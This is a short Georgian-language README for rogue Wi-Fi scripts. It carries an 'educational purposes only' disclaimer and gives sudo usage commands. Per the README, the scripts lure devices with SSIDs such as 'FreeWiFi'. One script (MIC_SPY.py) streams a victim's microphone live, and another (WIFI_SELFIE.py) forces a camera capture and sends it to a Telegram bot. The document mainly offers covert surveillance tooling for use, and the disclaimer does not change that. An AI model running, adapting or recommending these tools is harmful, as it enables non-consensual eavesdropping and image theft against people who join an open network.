ეს სკრიპტები შექმნილია **მხოლოდ საგანმანათლებლო, ტესტირებისა და კვლევის მიზნებისთვის**.  
არავითარ შემთხვევაში არ გამოიყენოთ ისინი სხვა ადამიანების თანხმობის გარეშე, საჯარო ადგილებში ან სხვაგან, სადაც შეიძლება დაირღვეს კანონი (პირადი ცხოვრების ხელშეუხებლობა, მონაცემთა დაცვა, კომპიუტერული თაღლითობა და ა.შ.).  
ავტორი არ იღებს პასუხისმგებლობას არასწორი გამოყენების შედეგებზე.

## როგორ გამოვიყენოთ (მხოლოდ ტესტირებისთვის!)

ყველა სკრიპტი მოითხოვს **root** უფლებებს (sudo) და Linux-ს (Kali, Ubuntu და სხვა).

მაგალითები:

```bash
# მიკროფონის live სტრიმინგი
sudo python3 MIC_SPY.py --ssid "TestMic" --pass "12345678"

# მუსიკის ავტო დაკვრა
sudo python3 WIFI_MUSIC.py --music song.mp3 --ssid "FreeMusic"

# ვიდეოს ავტო დაკვრა
sudo python3 WIFI_VIDEO.py --video clip.mp4 --ssid "MovieNight"

# სელფის აიძულებით აღება + Telegram
# (შეცვალეთ TELEGRAM_BOT_TOKEN და TELEGRAM_CHAT_ID!)
sudo python3 WIFI_SELFIE.py --ssid "FreeWiFi" --upstream wlp3s0
